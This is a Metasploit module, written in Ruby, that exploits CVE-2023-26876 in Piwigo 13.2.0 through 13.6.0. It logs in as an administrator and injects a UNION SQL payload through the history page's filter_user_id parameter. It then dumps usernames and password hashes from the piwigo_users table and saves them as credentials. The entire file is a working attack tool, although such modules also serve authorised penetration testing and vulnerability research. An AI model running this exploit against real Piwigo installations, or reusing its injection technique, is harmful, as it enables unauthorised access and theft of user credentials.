##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::SQLi
  prepend Msf::Exploit::Remote::AutoCheck
  require 'metasploit/framework/hashes'

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Piwigo CVE-2023-26876 Gather Credentials via SQL Injection ',
        'Description' => %q{
          This module retrieves usernames and password hashes through the history
          filter_user_id SQL injection in Piwigo 13.2.0 through 13.6.0. It requires
          an authenticated administrator. Piwigo 13.7.0 fixes this vulnerability.
        },
        'Author' => [
          'rodnt', # metasploit module
          'Rodolfo Tavares', # vulnerability discovery
          'Tempest Security, Henrique Arcoverde' # special thanks
        ],
        'License' => MSF_LICENSE,
        'References' => [
          [ 'CVE', '2023-26876' ],
          ['URL', 'https://nvd.nist.gov/vuln/detail/CVE-2023-26876'],
          ['URL', 'https://piwigo.org/release-13.7.0'],
        ],
        'DisclosureDate' => '2023-04-21',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )

    register_options(
      [
        OptString.new('TARGETURI', [ true, 'The base path to Piwigo', '/' ]),
        OptString.new('USERNAME', [ true, 'The username for authenticating to Piwigo', 'piwigo' ]),
        OptString.new('PASSWORD', [ true, 'The password for authenticating to Piwigo', 'piwigo' ])
      ]
    )
  end

  def check
    product_seen = false
    # Empty galleries omit the versioned assets on index.php; the ordinary
    # identification form still exposes them without authenticating.
    %w[index.php identification.php].each do |page|
      res = send_request_cgi('method' => 'GET', 'keep_cookies' => true, 'uri' => piwigo_uri(page))
      return Exploit::CheckCode::Unknown('Piwigo version request did not receive a response') unless res
      return Exploit::CheckCode::Unknown("Piwigo version request returned HTTP #{res.code}") unless res.code == 200

      html = res.get_html_document
      generator = html.at_css('meta[name="generator"]')&.[]('content')
      next unless generator.to_s.start_with?('Piwigo')

      product_seen = true
      version_text = html.css('script[src]').filter_map do |script|
        script['src'][%r{(?:\A|/)themes/default/js/jquery\.min\.js\?v([^&#]+)(?:[&#]|\z)}, 1]
      end.first
      next unless version_text

      begin
        version = Rex::Version.new(version_text)
      rescue ArgumentError => e
        elog('Invalid Piwigo version', error: e)
        return Exploit::CheckCode::Unknown('Piwigo returned an invalid version')
      end
      if version >= Rex::Version.new('13.2.0') && version < Rex::Version.new('13.7.0')
        return Exploit::CheckCode::Appears("Piwigo #{version} predates the history-filter fix in 13.7.0")
      end

      return Exploit::CheckCode::Safe("Piwigo #{version} is outside the affected 13.2.0-13.6.x range")
    end
    product_seen ? Exploit::CheckCode::Detected('Piwigo detected without a version') : Exploit::CheckCode::Safe('Target did not identify as Piwigo')
  rescue Rex::ConnectionError, OpenSSL::SSL::SSLError => e
    elog('Piwigo version request failed', error: e)
    Exploit::CheckCode::Unknown('Piwigo version request failed to connect')
  end

  def login
    print_status('Logging into Piwigo')
    # Piwigo requires a session cookie before POST login. Start a fresh session
    # independently of AutoCheck and any previously authenticated credentials.
    cookie_jar.clear
    form = send_request_cgi('method' => 'GET', 'uri' => piwigo_uri('identification.php'), 'keep_cookies' => true)
    fail_with(Failure::Unreachable, 'Piwigo login form did not receive a response') unless form
    fail_with(Failure::UnexpectedReply, "Piwigo login form returned HTTP #{form.code}") unless form.code == 200

    res = send_request_cgi(
      'method' => 'POST',
      'uri' => piwigo_uri('identification.php'),
      'keep_cookies' => true,
      'vars_post' => { 'username' => datastore['USERNAME'], 'password' => datastore['PASSWORD'], 'login' => 'Login' }
    )
    fail_with(Failure::Unreachable, 'Piwigo login did not receive a response') unless res
    fail_with(Failure::NoAccess, 'Piwigo login was rejected') unless res.code == 302

    print_good('Successfully logged into Piwigo')
  end

  def dump_data(sqli)
    rows = sqli.dump_table_fields('piwigo_users', %w[username password])
    table = Rex::Text::Table.new('Header' => 'Piwigo Users', 'Indent' => 1, 'Columns' => ['username', 'hash'])
    rows.each do |row|
      unless row.is_a?(Array) && (1..2).cover?(row.length) && row.all? { |field| field.is_a?(String) }
        fail_with(Failure::UnexpectedReply, 'Piwigo user extraction returned a malformed row')
      end
      user = piwigo_text(row[0])
      # Common maps NULL to an empty string and may omit a trailing empty field.
      hash = piwigo_text(row[1] || '')
      table << [user, hash]
      next if hash.empty?

      create_credential(
        workspace_id: myworkspace_id,
        origin_type: :service,
        module_fullname: fullname,
        username: user,
        private_type: :nonreplayable_hash,
        jtr_format: Metasploit::Framework::Hashes.identify_hash(hash),
        private_data: hash,
        service_name: 'piwigo',
        address: rhost,
        port: rport,
        protocol: 'tcp',
        status: Metasploit::Model::Login::Status::UNTRIED
      )
    end
    print_status('Dump of usernames and hashes:')
    print_line(table.to_s)
  end

  def get_info
    probing = true
    sqli = create_sqli(dbms: MySQLi::Common, opts: { hex_encode_strings: true, encoder: :hex, safe: true }) do |payload|
      res = send_request_cgi(
        'method' => 'GET',
        'uri' => piwigo_uri('admin.php'),
        'vars_get' => { 'page' => 'history', 'filter_image_id' => '1', 'filter_user_id' => "123123123 union all #{payload}" }
      )
      fail_with(Failure::Unreachable, 'Piwigo history request did not receive a response') unless res
      fail_with(Failure::NoAccess, 'Piwigo history requires an authenticated administrator') if [301, 302, 401, 403].include?(res.code)
      fail_with(Failure::UnexpectedReply, "Piwigo history returned HTTP #{res.code}") unless res.code == 200

      scalar = res.body.to_s[/^\s*var\s+filter_user_name\s*=\s*"([^"]*)";/, 1]
      if !probing && (scalar.nil? || scalar.empty? || !scalar.match?(/\A[0-9a-f;]+\z/i))
        fail_with(Failure::UnexpectedReply, 'Piwigo history did not return the expected encoded result')
      end
      scalar
    end
    fail_with(Failure::NotVulnerable, 'Piwigo history did not return the SQL injection probe') unless sqli.test_vulnerable

    print_good('Target is vulnerable')
    probing = false
    dump_data(sqli)
  end

  def run
    login
    get_info
  rescue Rex::ConnectionError, OpenSSL::SSL::SSLError => e
    elog('Piwigo credential collection failed to connect', error: e)
    fail_with(Failure::Unreachable, 'Piwigo credential collection failed to connect')
  end

  private

  def piwigo_uri(page)
    base = target_uri.path.sub(/(?:index|identification)\.php\z/, '')
    normalize_uri(base, page)
  end

  def piwigo_text(value)
    text = value.dup.force_encoding(::Encoding::UTF_8)
    fail_with(Failure::UnexpectedReply, 'Piwigo returned text that is not valid UTF-8') unless text.valid_encoding?

    text
  end
end
